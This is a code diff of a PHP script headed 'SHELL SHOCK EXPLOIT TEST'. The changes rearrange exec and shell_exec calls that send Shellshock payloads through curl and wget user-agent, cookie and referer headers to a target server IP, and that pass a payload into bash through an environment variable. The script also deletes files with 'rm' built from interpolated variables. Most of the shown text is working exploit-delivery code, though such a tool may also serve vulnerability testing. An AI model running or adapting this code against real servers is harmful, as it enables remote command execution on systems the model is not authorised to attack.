@@ -131,7 +131,7 @@ for (( ;; )) do echo tmp; done
  ******************************************/
 if(function_exists('exec')){exec("rm $filePath$fileName*$fileExt");}					//using exec
 else if(function_exists('shell_exec')){shell_exec("rm $filePath$fileName*$fileExt");}	//else using shellexec
-else{array_map('unlink', glob("$filePath$fileName*$fileExt"));}						//else using php
+else{array_map('unlink', glob("$filePath$fileName*$fileExt"));}							//else using php
  
 /******************************************
  * ------ [ HTML LVL CHOICE FUNC ] ------ *
@@ -188,8 +188,8 @@ if(function_exists('exec'))
 	{
 	echo '<h1>SHELL SHOCK EXPLOIT TEST (php exec + shell curl + shell wget)</h1>';
 	exec("env var='".strFullCmd(strCmd('phpExec'),$lvl)."' /bin/bash -c /bin/true");
-	exec('curl --user-agent '.strFullCmd(strCmd('bashCurl1.0'),$lvl).' --cookie '.strFullCmd(strCmd('bashCurl2.0'),$lvl).' --referer '.strFullCmd(strCmd('bashCurl3.0'),$lvl).' '.$serverIp);
-	exec('wget -q -O --user-agent '.strFullCmd(strCmd('bashWget1.0'),$lvl).' --cookie '.strFullCmd(strCmd('bashWget2.0'),$lvl).' --referer '.strFullCmd(strCmd('bashWget3.0'),$lvl).' '.$serverIp);
+	exec('curl '.$serverIp.' --user-agent '.strFullCmd(strCmd('bashCurl1.0'),$lvl).' --cookie '.strFullCmd(strCmd('bashCurl2.0'),$lvl).' --referer '.strFullCmd(strCmd('bashCurl3.0'),$lvl));
+	exec('wget '.$serverIp.' -q -O --user-agent '.strFullCmd(strCmd('bashWget1.0'),$lvl).' --cookie '.strFullCmd(strCmd('bashWget2.0'),$lvl).' --referer '.strFullCmd(strCmd('bashWget3.0'),$lvl));
 	echo htmlentities("exec() test = ".$_ENV["var"])."<br><br>";	
 	echo htmlentities('exec() test = curl --user-agent '.strFullCmd(strCmd('bashCurl1.0'),$lvl).' --cookie '.strFullCmd(strCmd('bashCurl2.0'),$lvl).' --referer '.strFullCmd(strCmd('bashCurl3.0'),$lvl).' '.$serverIp)."<br><br>";
 	echo htmlentities('exec() test = wget -q -O --user-agent '.strFullCmd(strCmd('bashWget1.0'),$lvl).' --cookie '.strFullCmd(strCmd('bashWget2.0'),$lvl).' --referer '.strFullCmd(strCmd('bashWget3.0'),$lvl).' '.$serverIp)."<br><br>";
@@ -201,8 +201,8 @@ if(function_exists('shell_exec'))
 	{
 	echo '<h1>SHELL SHOCK EXPLOIT TEST (php shell_exec + shell curl + shell wget)</h1>';
 	shell_exec("env var='".strFullCmd(strCmd('phpShellExec'),$lvl)."' /bin/bash -c /bin/true");
-	shell_exec('curl --user-agent '.strFullCmd(strCmd('bashCurl1.1'),$lvl).' --cookie '.strFullCmd(strCmd('bashCurl2.1'),$lvl).' --referer '.strFullCmd(strCmd('bashCurl3.1'),$lvl).' '.$serverIp);
-	shell_exec('wget -q -O --user-agent '.strFullCmd(strCmd('bashWget1.1'),$lvl).' --cookie '.strFullCmd(strCmd('bashWget2.1'),$lvl).' --referer '.strFullCmd(strCmd('bashWget3.1'),$lvl).' '.$serverIp);
+	shell_exec('curl '.$serverIp.' --user-agent '.strFullCmd(strCmd('bashCurl1.1'),$lvl).' --cookie '.strFullCmd(strCmd('bashCurl2.1'),$lvl).' --referer '.strFullCmd(strCmd('bashCurl3.1'),$lvl));
+	shell_exec('wget '.$serverIp.' -q -O --user-agent '.strFullCmd(strCmd('bashWget1.1'),$lvl).' --cookie '.strFullCmd(strCmd('bashWget2.1'),$lvl).' --referer '.strFullCmd(strCmd('bashWget3.1'),$lvl));
 	echo htmlentities("shell_exec() test = ".$_ENV["var"])."<br><br>";	
 	echo htmlentities('shell_exec() test = curl --user-agent '.strFullCmd(strCmd('bashCurl1.1'),$lvl).' --cookie '.strFullCmd(strCmd('bashCurl2.1'),$lvl).' --referer '.strFullCmd(strCmd('bashCurl3.1'),$lvl).' '.$serverIp)."<br><br>";
 	echo htmlentities('shell_exec() test = wget -q -O --user-agent '.strFullCmd(strCmd('bashWget1.1'),$lvl).' --cookie '.strFullCmd(strCmd('bashWget2.1'),$lvl).' --referer '.strFullCmd(strCmd('bashWget3.1'),$lvl).' '.$serverIp)."<br><br>";
